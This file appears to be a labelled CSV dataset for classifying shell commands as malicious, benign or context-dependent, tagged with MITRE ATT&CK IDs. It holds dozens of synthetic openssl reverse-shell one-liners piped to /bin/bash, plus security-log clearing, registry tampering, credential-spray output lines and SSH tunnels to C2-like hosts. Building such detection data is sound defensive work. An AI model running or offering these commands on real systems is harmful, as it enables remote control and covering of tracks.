command,label,original_label,mitre_id
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
find /home/mywebsite/public_html/sites/all/modules -type d -exec chmod 750 {} +,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:8081,Malicious,Synthetic,Synthetic
"wtype -d 500 -- ""text""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:143,Malicious,Synthetic,Synthetic
sherlock --unique-tor username,Benign,Benign,Benign
NSXPCConnection API,Malicious,Malicious,T1559
wevtutil cl security,Malicious,Malicious,T1070
cd .\tmp\victim-files,Malicious,Malicious,T1560
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,Malicious,Malicious,T1564
command | more,Benign,Benign,Benign
ls -la /etc/cron.daily/,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:9001,Malicious,Synthetic,Synthetic
telegram-desktop -autostart,Benign,Benign,Benign
cdrecord dev=/dev/optical_drive -audio track*.cdaudio,Benign,Benign,Benign
flexget execute --now,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.10:9001 user@172.16.5.20,Context_Dependent,Synthetic,Synthetic
imv -t 10 path/to/directory,Benign,Benign,Benign
blkpr [-c|--command] release [-k|--key] reservation_key [-t|--type] reservation_type path/to/device,Benign,Benign,Benign
tldr getTGT.py,Benign,Benign,Benign
pcalua.exe -a {PATH:.exe},Malicious,Malicious,T1202
docker [pull|image pull] image:tag,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
pacman -Th,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
acpi [-c|--cooling],Benign,Benign,Benign
find /tmp -name core -type f -print0 | xargs -0 /bin/rm -f,Benign,Benign,Benign
mixxx --fullScreen,Benign,Benign,Benign
"Write-Host "" [-] Attempting ${password} on account $username.""",Malicious,Malicious,T1110
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:9002,Malicious,Synthetic,Synthetic
strip-nondeterminism --type filetype path/to/file,Benign,Benign,Benign
pihole [-q|query] example.com,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:995,Malicious,Synthetic,Synthetic
pass otp append [-s|--secret] [-i|--issuer] issuer_name [-a|--account] account_name path/to/pass,Benign,Benign,Benign
jupytext --to notebook --execute path/to/notebook.md,Benign,Benign,Benign
find / -iname '*.txt',Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:8081,Malicious,Synthetic,Synthetic
echo x | xargs -o -a /dev/null /bin/sh,Malicious,Malicious,T1059
openssl s_client -quiet -connect 192.168.1.10:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
pnmpad [-l|-left] 100 [-ri|-right] 150 [-t|-top] 123 [-bo|-bottom] 456 path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
md-to-clip --help,Benign,Benign,Benign
pstree -A -s $$,Context_Dependent,Benign,Benign
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0',Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8081,Malicious,Synthetic,Synthetic
"echo ""url=http://example.com"" | git credential approve",Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.1:6379 jenkins@172.20.10.8,Context_Dependent,Synthetic,Synthetic
tcpdump -i any -n -c 445,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8888,Malicious,Synthetic,Synthetic
wn emphatically,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:110,Malicious,Synthetic,Synthetic
poetry export [-o|--output] requirements.txt --without-hashes,Benign,Benign,Benign
tcpdump -i wlan0 -c 8888,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.50:80 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:172.16.5.20:80 root@payload.c2,Context_Dependent,Synthetic,Synthetic
dmesg | less,Benign,Benign,Benign
decaffeinate path/to/file.coffee,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:993,Malicious,Synthetic,Synthetic
rpm -qa | grep ssh,Benign,Synthetic,Synthetic
tmux attach -t <session name>,Benign,Benign,Benign
bru run file.bru,Benign,Benign,Benign
dialog --textbox /path/to/input-file 0 0,Context_Dependent,Malicious,T1005
sysctl net.ipv4.conf.all.forwarding,Context_Dependent,Synthetic,Synthetic
koji cancel task_id1 task_id2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:4445,Malicious,Synthetic,Synthetic
cargo init,Benign,Benign,Benign
pip install --upgrade django,Benign,Synthetic,Synthetic
msg /server:server_name username|session_name|session_id,Benign,Benign,Benign
xctool -project YourProject.xcodeproj -scheme YourScheme build,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
"find . -maxdepth 1 -type f ! -name '*.gz' -exec gzip ""{}"" \;",Benign,Benign,Benign
md5 path/to/file,Benign,Benign,Benign
surge path/to/project,Benign,Benign,Benign
tcpdump -i wlan0 port 445,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:5432,Malicious,Synthetic,Synthetic
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f",Malicious,Malicious,T1112
kubectl rollout restart resource_type/resource_name,Benign,Benign,Benign
systemctl is-active docker,Context_Dependent,Synthetic,Synthetic
systemctl list-unit-files --state=disabled,Context_Dependent,Synthetic,Synthetic
cabal init,Benign,Benign,Benign
export VARIABLE=value,Benign,Benign,Benign
( awk 'NR % 2' input; awk 'NR % 2 == 0' input ) | paste - - - | column -s' ' -t,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
systemctl list-timers,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.8:22 svcuser@10.0.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:993,Malicious,Synthetic,Synthetic
"find . -type f -name ""*html"" -exec perl -pi -e 's|pibeta.psi.ch/~stefan|midas.psi.ch/~stefan|g' {} ;",Benign,Benign,Benign
lerna exec -- ls,Benign,Benign,Benign
"getent passwd | cut -d: -f1 | perl -e'while(<>){chomp;$l = `crontab -u $_ -l 2>/dev/null`;print ""$_\n$l\n"" if $l}'",Context_Dependent,Benign,Benign
ssh-copy-id -i path/to/certificate username@remote_host,Benign,Benign,Benign
ip ssh version 2,Benign,Benign,Benign
tail -100 /var/log/dmesg,Context_Dependent,Synthetic,Synthetic
tail -100 /var/log/maillog,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:9002,Malicious,Synthetic,Synthetic
tail -50 /var/log/boot.log,Context_Dependent,Synthetic,Synthetic
tmt,Benign,Benign,Benign
ghost start,Benign,Benign,Benign
sudo qm [resu|resume] vm_id --skiplock true,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
tcpdump -i ens33,Context_Dependent,Synthetic,Synthetic
find . -size -10k,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
"find . -maxdepth 1 -empty -not -name "".*""",Benign,Benign,Benign
stormlock acquire resource,Benign,Benign,Benign
termusic path/to/directory,Benign,Benign,Benign
tcpdump -i enp0s3 -c 8080,Context_Dependent,Synthetic,Synthetic
pkginfo [-o|--owner] pattern,Benign,Benign,Benign
id3tag --album album *.mp3,Benign,Benign,Benign
scrot [-s|--select],Benign,Benign,Benign
gammastep -x,Benign,Benign,Benign
find /var/spool -mtime +60,Benign,Benign,Benign
find -mindepth num -name query,Benign,Benign,Benign
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},Malicious,Malicious,T1216
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8081,Malicious,Synthetic,Synthetic
"ren ""%temp%\upload"" audiodg.exe",Malicious,Malicious,T1036
vssadmin list shadows,Malicious,Malicious,T1680
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
sudo bridge [v|vlan] [d|delete] dev lanX vid vlan_id,Benign,Benign,Benign
wc `find | grep .php$`,Benign,Benign,Benign
ssh -w 0:0 support@10.0.0.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:143,Malicious,Synthetic,Synthetic
ascii-xfr -ns /path/to/input-file,Context_Dependent,Malicious,T1005
cat $i | xargs mv -t dir.$count,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
theHarvester -d malware.site -b google,Context_Dependent,Synthetic,Synthetic
dart compile exe path/to/file.dart,Benign,Benign,Benign
bunx package_name --version,Benign,Benign,Benign
yacc -d path/to/grammar_file.y -v -b prefix,Benign,Benign,Benign
coredumpctl debug,Benign,Benign,Benign
%APPDATA%,Malicious,Malicious,T1564
VirtualFree,Malicious,Malicious,T1106
bleachbit --gui,Benign,Benign,Benign
path/to/PalServer.sh -publiclobby,Benign,Benign,Benign
"cmstp /su ""path\to\profile_file""",Benign,Benign,Benign
sysctl -a 2>/dev/null | head -50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:8081,Malicious,Synthetic,Synthetic
tcpdump -i wlan0 port 80,Context_Dependent,Synthetic,Synthetic
az redis create --location location [-n|--name] name [-g|--resource-group] resource_group --sku Basic|Premium|Standard --vm-size c0|c1|c2|c3|c4|c5|c6|p1|p2|p3|p4|p5,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:3306 user@192.168.1.100,Context_Dependent,Synthetic,Synthetic
zstd [-d|--decompress] [-c|--stdout] path/to/file.zst,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:3306 operator@support.internal,Context_Dependent,Synthetic,Synthetic
zola build --output-dir path/to/output_directory/,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8081,Malicious,Synthetic,Synthetic
"find / -name ""[a-j]*"" -print",Context_Dependent,Benign,Benign
ssh -fN -L 8080:10.0.0.10:3306 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
llvd [-c|--course] course-slug [-r|--resolution] 720,Benign,Benign,Benign
php -S 0.0.0.0:80,Malicious,Malicious,T1105
subfinder -d ops-audit.internal,Context_Dependent,Synthetic,Synthetic
makepasswd --string bar,Benign,Benign,Benign
git p4 sync path/to/p4_depot,Benign,Benign,Benign
wmic process call create,Malicious,Malicious,T1047
lilypond [-o|--output] path/to/output_file path/to/input_file,Benign,Benign,Benign
theHarvester -d update.bad -b google,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
tcpdump -i ens160 -c 8080,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
git verify-commit commit_hash1 optional_commit_hash2 ... --raw,Benign,Benign,Benign
aws configure wizard,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
InstallLanguage,Context_Dependent,Malicious,T1614
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
"csvcut [-c|--columns] id,""first name"" data.csv",Benign,Benign,Benign
sudo slabtop,Benign,Benign,Benign
ipconfig /release adapter,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:3389,Malicious,Synthetic,Synthetic
colrm 1 1,Benign,Benign,Benign
appman [-r|remove] package,Benign,Benign,Benign
"xml [ed|edit] [-u|--update] ""xml/table/rec[@id=3]/@id"" [-v|--value] 5 path/to/input.xml|URI",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:5432,Malicious,Synthetic,Synthetic
feh [-D|--slideshow-delay] seconds path/to/images,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:8081,Malicious,Synthetic,Synthetic
sudo semanage login [-d|--delete] linux_username,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
"join -t, -a1 -a2 <(sort file1) <(sort file2)",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8888,Malicious,Synthetic,Synthetic
"Write-Host "" [!] ${user}:$password are valid credentials!`r`n""",Malicious,Malicious,T1110
ssh -fN -L 8080:10.0.0.5:5432 support@172.16.0.10,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.1:80 jenkins@172.16.0.25,Context_Dependent,Synthetic,Synthetic
"semver 1.2.3 --range ""^1.0""",Benign,Benign,Benign
find . -follow -iname '*.htm' -print0 | xargs -i -0 mv '{}' ~/webhome,Benign,Benign,Benign
cython --cplus path/to/file,Benign,Benign,Benign
sudo ls -hal /root/ | sudo dd of=/root/test.out,Context_Dependent,Benign,Benign
minidlna -f path/to/minidlna.conf,Benign,Benign,Benign
bluetoothd,Benign,Benign,Benign
telnet localhost port_number,Benign,Benign,Benign
aura [-Akua|--aursync --diff --sysupgrade --delmakedeps],Benign,Benign,Benign
"sed '/start/,+4d'",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:4445,Malicious,Synthetic,Synthetic
"tgpt --provider openai|opengpts|koboldai|phind|llama2|blackboxai [-q|--quiet] [-w|--whole] ""prompt""",Benign,Benign,Benign
env - `cat ~/cronenv` /bin/sh,Benign,Benign,Benign
pop,Benign,Benign,Benign
setx variable value /M,Benign,Benign,Benign
net group /dom,Context_Dependent,Malicious,T1087
ssh -fN -L 8080:10.10.10.50:53 support@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.25:80 root@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
"logger.exe ""{CMD}""",Malicious,Malicious,T1202
gita group add [-n|--name] group_name repo1 repo2 ... && gita context group_name,Benign,Benign,Benign
r2e list,Benign,Benign,Benign
find lpi104-6 -inum 1988884,Benign,Benign,Benign
ln $file /tmp/allfiles,Benign,Benign,Benign
tcpdump -i ens33 -c 4444,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:8081,Malicious,Synthetic,Synthetic
lsof,Context_Dependent,Malicious,T1049
highlight [-o|--out-format] html [-s|--style] theme_name [-S|--syntax] language path/to/source_code,Benign,Benign,Benign
find . -mtime -1 | xargs tar --no-recursion -czf myfile.tgz,Benign,Benign,Benign
net use,Context_Dependent,Malicious,T1049
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:110,Malicious,Synthetic,Synthetic
paclock --print,Benign,Benign,Benign
find . -type d -iname \*music_files\*,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:1433,Malicious,Synthetic,Synthetic
"history -r ""$HISTFILE"" #Alternative: exec bash",Context_Dependent,Benign,Benign
gh issue [ls|list] [-s|--state] closed [-A|--author] username,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
